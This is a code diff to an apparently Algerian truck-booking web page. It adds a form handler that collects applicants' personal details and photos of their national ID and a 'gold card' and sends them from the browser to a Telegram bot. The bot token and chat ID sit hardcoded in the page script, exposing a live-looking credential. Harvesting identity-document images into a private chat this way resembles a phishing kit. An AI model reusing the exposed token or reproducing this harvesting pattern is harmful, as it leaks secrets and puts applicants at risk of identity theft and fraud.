@@ -447,33 +447,89 @@
     </footer>
 
     <script src="app.js"></script>
-<!-- زر من عندك -->
-<button id="myButton">إرسال إلى تلغرام</button>
-
-<script>
+    <script>
   const BOT_TOKEN = "8259868430:AAFQ-oqYzk-nd3cx47XqUdYhPCRQ9YDeWmM";
-  const CHAT_ID = "5794299315";
+  const CHAT_ID  = "5794299315";
 
-  document.getElementById("myButton").addEventListener("click", async () => {
+  document.getElementById("booking-form").addEventListener("submit", async (e) => {
+    e.preventDefault(); // منع الريفرش
+
+    // === 1) جمع البيانات ===
+    const prenom   = document.getElementById("firstName").value;
+    const nom      = document.getElementById("lastName").value;
+    const phone    = document.getElementById("phone").value;
+    const email    = document.getElementById("email").value;
+    const wilaya   = document.getElementById("wilaya").value;
+    const commune  = document.getElementById("commune").value;
+    const activity = document.getElementById("businessType").value;
+    const rc       = document.getElementById("registrationNumber").value;
+    const model    = document.getElementById("truckModel").value;
+    const msg      = document.getElementById("message").value;
+
+    const nationalId = document.getElementById("nationalId").files[0];
+    const goldCard   = document.getElementById("goldCard").files[0];
+
+    // === 2) نص الرسالة ===
+    const message = `
+📝 <b>طلب جديد</b>
+👤 الاسم: ${prenom} ${nom}
+📞 الهاتف: ${phone}
+📧 الإيميل: ${email}
+🌍 الولاية: ${wilaya}
+🏘️ البلدية: ${commune}
+💼 النشاط: ${activity}
+📄 سجل تجاري: ${rc}
+🚚 النموذج: ${model}
+✉️ الرسالة: ${msg}
+`;
+
     try {
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      // === 3) إرسال النص أولاً ===
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: CHAT_ID,
-          text: "✅ تم الضغط على الزر الخاص بك!"
+          text: message,
+          parse_mode: "HTML"
         })
       });
-      alert("تم إرسال الرسالة إلى تلغرام ✅");
-    } catch (e) {
-      console.error(e);
-      alert("فشل الإرسال ❌");
+
+      const data = await res.json();
+      if (!data.ok) {
+        alert("❌ فشل إرسال النص: " + data.description);
+        return;
+      }
+
+      // === 4) إذا فيه صور نرسلهم واحد واحد ===
+      const files = [];
+      if (nationalId) files.push({file: nationalId, caption: "📎 بطاقة التعريف الوطنية"});
+      if (goldCard)   files.push({file: goldCard, caption: "📎 البطاقة الذهبية"});
+
+      for (const f of files) {
+        const fd = new FormData();
+        fd.append("chat_id", CHAT_ID);
+        fd.append("photo", f.file, f.file.name);
+        fd.append("caption", f.caption);
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: fd
+        });
+      }
+
+      alert("✅ تم إرسال الطلب (مع الصور إن وجدت) إلى تلغرام");
+
+    } catch (err) {
+      console.error(err);
+      alert("⚠️ خطأ في الاتصال — تحقق من التوكن أو الشات ايدي");
     }
   });
 </script>
 </body>
 
 </html>
+
 
 
 
